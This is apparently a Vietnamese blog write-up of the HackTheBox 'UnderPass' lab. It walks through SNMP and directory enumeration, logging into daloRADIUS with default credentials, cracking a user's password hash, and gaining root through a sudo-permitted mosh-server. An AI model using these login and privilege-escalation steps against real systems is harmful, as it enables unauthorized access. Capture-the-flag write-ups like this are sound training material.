---
layout:
  - post
author: Neo
title: Hackthebox - UnderPass
date: 2025-02-01
tags:
  - web
  - linux
  - ssh
  - snmp
  - daloradius
  - mosh
  - cron
  - hackthebox
categories: ctf
---
1. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2025-02-01-HTB-UnderPass/UnderPass.png)

## Reconnaissance and Scanning

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Thử truy cập port 80 và thử một số cách thức đơn giản để khai thác web này, nhưng về cơ bản là tôi không tìm thấy được gì đặc biệt.

Sau một lúc tìm kiếm loanh quanh thì tôi lướt đến port 161 trên Hacktricks, và tôi nghĩ đến UDP Scan

Tôi sẽ thử scan một số port UDP thông dụng

```bash
┌──(kali㉿kali)-[~/htb-overpass]
└─$ nmap -sU -p35,161,137,138,69 -sV 10.10.11.48 -oN nmap-udp
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 10:35 EST
Nmap scan report for 10.10.11.48
Host is up (0.23s latency).

PORT    STATE  SERVICE     VERSION
35/udp  closed priv-print
69/udp  closed tftp
137/udp closed netbios-ns
138/udp closed netbios-dgm
161/udp open   snmp        SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds
```

Vậy là tôi có port 161 đang mở

## Enumeration and Gaining access

Sử dụng `snmpwalk`

```bash
┌──(kali㉿kali)-[~/htb-overpass]
└─$ snmpwalk -v 1 -c public underpass.htb
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (10535620) 1 day, 5:15:56.20
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (10537637) 1 day, 5:16:16.37
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 02 09 0F 19 29 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

Tôi nhận được 1 email *steve@underpass.htb* và daloradius server.

Tìm kiếm thông tin về daloradius server, [daloRADIUS](https://github.com/lirantal/daloradius) là một giao diện web mã nguồn mở để quản lý **FreeRADIUS**, giúp người dùng dễ dàng quản lý **tài khoản, phiên đăng nhập, log và báo cáo** của hệ thống RADIUS. Nó được viết bằng PHP và hỗ trợ cơ sở dữ liệu **MySQL, PostgreSQL, SQLite**.

Kiểm tra mã nguồn của nó, tôi tìm thấy 1 số path mà có thể hữu ích: trong `/app` có `/users`. Tuy nhiên truy cập trên web thì không có path này

Thử một số path khác thì tôi nhận được 

![forbidden](/assets/img/2025-02-01-HTB-UnderPass/403.png)

Sử dụng `feroxbuster`

```bash
┌──(kali㉿kali)-[~/htb-overpass]
└─$ feroxbuster -u http://underpass.htb/daloradius
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://underpass.htb/daloradius
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      319c http://underpass.htb/daloradius => http://underpass.htb/daloradius/
301      GET        9l       28w      323c http://underpass.htb/daloradius/doc => http://underpass.htb/daloradius/doc/
301      GET        9l       28w      325c http://underpass.htb/daloradius/setup => http://underpass.htb/daloradius/setup/
301      GET        9l       28w      323c http://underpass.htb/daloradius/app => http://underpass.htb/daloradius/app/
301      GET        9l       28w      327c http://underpass.htb/daloradius/library => http://underpass.htb/daloradius/library/
301      GET        9l       28w      330c http://underpass.htb/daloradius/app/common => http://underpass.htb/daloradius/app/common/
301      GET        9l       28w      329c http://underpass.htb/daloradius/app/users => http://underpass.htb/daloradius/app/users/
301      GET        9l       28w      337c http://underpass.htb/daloradius/app/users/include => http://underpass.htb/daloradius/app/users/include/
301      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/include/config => http://underpass.htb/daloradius/app/users/include/config/
301      GET        9l       28w      336c http://underpass.htb/daloradius/app/users/static => http://underpass.htb/daloradius/app/users/static/
301      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/include/common => http://underpass.htb/daloradius/app/users/include/common/
301      GET        9l       28w      334c http://underpass.htb/daloradius/app/users/lang => http://underpass.htb/daloradius/app/users/lang/
301      GET        9l       28w      327c http://underpass.htb/daloradius/contrib => http://underpass.htb/daloradius/contrib/
301      GET        9l       28w      337c http://underpass.htb/daloradius/app/users/library => http://underpass.htb/daloradius/app/users/library/
301      GET        9l       28w      335c http://underpass.htb/daloradius/contrib/scripts => http://underpass.htb/daloradius/contrib/scripts/
301      GET        9l       28w      330c http://underpass.htb/daloradius/contrib/db => http://underpass.htb/daloradius/contrib/db/
301      GET        9l       28w      342c http://underpass.htb/daloradius/app/users/include/menu => http://underpass.htb/daloradius/app/users/include/menu/
301      GET        9l       28w      343c http://underpass.htb/daloradius/app/users/static/images => http://underpass.htb/daloradius/app/users/static/images/
301      GET        9l       28w      339c http://underpass.htb/daloradius/app/users/static/js => http://underpass.htb/daloradius/app/users/static/js/
301      GET        9l       28w      348c http://underpass.htb/daloradius/app/users/library/javascript => http://underpass.htb/daloradius/app/users/library/javascript/
301      GET        9l       28w      331c http://underpass.htb/daloradius/doc/install => http://underpass.htb/daloradius/doc/install/
301      GET        9l       28w      338c http://underpass.htb/daloradius/app/common/library => http://underpass.htb/daloradius/app/common/library/
301      GET        9l       28w      347c http://underpass.htb/daloradius/contrib/scripts/maintenance => http://underpass.htb/daloradius/contrib/scripts/maintenance/
301      GET        9l       28w      348c http://underpass.htb/daloradius/app/common/library/phpmailer => http://underpass.htb/daloradius/app/common/library/phpmailer/
301      GET        9l       28w      343c http://underpass.htb/daloradius/app/users/notifications => http://underpass.htb/daloradius/app/users/notifications/
200      GET      247l     1010w     7814c http://underpass.htb/daloradius/doc/install/INSTALL
301      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/library/graphs => http://underpass.htb/daloradius/app/users/library/graphs/
```

Về cơ bản thì mã nguồn được chứa trong thư mục `/daloradius/`

Sau khi ngụp lặn trong mã nguồn thì tôi nhận thấy các config cũng như các phần quản lý nằm trong `/operators/`

![login](/assets/img/2025-02-01-HTB-UnderPass/login.png)

Vẫn là trong mã nguồn và cả trong các Issues, tôi tìm thấy thông tin đăng nhập mặc định `administrator:radius` và thử đăng nhập vào nó

Boom...

![radius](/assets/img/2025-02-01-HTB-UnderPass/radius.png)

## SSH and User flag

Kiểm tra users list, tôi có 1 user và password

![svcmosh](/assets/img/2025-02-01-HTB-UnderPass/svcmosh.png)

Copy password này vào Crackstation và tôi nhận được pass của user svcMosh

```bash
┌──(kali㉿kali)-[~/htb-overpass]
└─$ ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Feb 10 09:07:51 AM UTC 2025

  System load:  0.19              Processes:             253
  Usage of /:   71.6% of 6.56GB   Users logged in:       1
  Memory usage: 31%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Feb 10 06:36:04 2025 from 10.10.16.25
svcMosh@underpass:~$ ls
traitor-amd64  user.txt
```

## Privilege escalation

`sudo -l`

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

`crontab`

```bash
svcMosh@underpass:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
#* * * * *  root mosh --local 127.0.0.1
```

Với `sudo -l` tôi có thể chạy mosh-server với quyền `root`. `crontab` truy cập localhost thông qua mosh. *Mosh* cũng tương tự như SSH cho phép truy cập vào server thông qua username và password

Tôi tìm thấy cách leo thang đặc quyền với *Mosh* ở [đây](https://medium.com/@momo334678/mosh-server-sudo-privilege-escalation-82ef833bb246)

Đầu tiên tạo một mosh-server mới với port được chỉ định

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -i 127.0.0.1 -p 60010


MOSH CONNECT 60010 I7hqnaOsdBVY3Yc8BJfpGg

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 200308]
svcMosh@underpass:~$ 
```

Truy cập mosh-server để lấy `root` với MOSH_KEY chính là đoạn key vừa tạo ở bước trên.

```bash
svcMosh@underpass:~$ MOSH_KEY=h+BFdQKt6sFjrGb/Zd1DfQ mosh-client 127.0.0.1 60010
```

```bash
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Feb 10 04:44:32 PM UTC 2025

  System load:  0.0               Processes:             253
  Usage of /:   73.9% of 6.56GB   Users logged in:       2
  Memory usage: 31%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Mosh: You have 2 detached Mosh sessions on this server, with PIDs:
        - mosh [130995]
        - mosh [192326]


root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# ll
total 44
drwx------  6 root root 4096 Feb  8 10:10 ./
drwxr-xr-x 18 root root 4096 Dec 11 16:06 ../
lrwxrwxrwx  1 root root    9 Nov 30 10:39 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Sep 22 01:27 .cache/
drwx------  3 root root 4096 Dec 11 13:40 .config/
-rw-------  1 root root   20 Dec 19 12:42 .lesshst
drwxr-xr-x  3 root root 4096 Dec 11 16:06 .local/
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Feb  8 10:10 root.txt
drwx------  2 root root 4096 Dec 11 16:06 .ssh/
-rw-r--r--  1 root root  165 Dec 11 16:38 .wget-hsts
root@underpass:~# 
```
